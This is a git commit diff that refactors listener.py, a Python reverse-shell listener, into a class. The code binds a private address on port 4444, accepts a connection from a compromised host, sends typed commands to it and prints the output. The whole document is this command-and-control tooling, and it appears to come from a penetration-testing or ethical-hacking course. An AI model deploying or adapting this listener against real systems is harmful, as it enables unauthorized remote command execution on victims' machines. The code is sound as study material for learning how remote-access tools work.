8aafe28876321dcf9ce3982a2c9d6ef87bfc835b
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-11-17 11:07:53 -0500

    Refactored into a class

--- listener.py
+++ listener.py
@@ -2,16 +2,24 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("10.0.2.15", 4444))
-listener.listen(0)
-print("[+] Waiting for connection.\n")
-connection, address = listener.accept()
-print("\n[+] Got a connection from " + str(address))
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for connection.\n")
+        self.connection, address = listener.accept()
+        print("\n[+] Got a connection from " + str(address))
 
-while True:
-    command = raw_input(">> ")
-    connection.send(command)
-    result = connection.recv(1024)
-    print(result)
+    def execute_remotely(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = raw_input(">> ")
+            result = self.execute_remotely(command)
+            print(result)
+my_listener = Listener("10.0.2.15", 4444)
+my_listener.run()
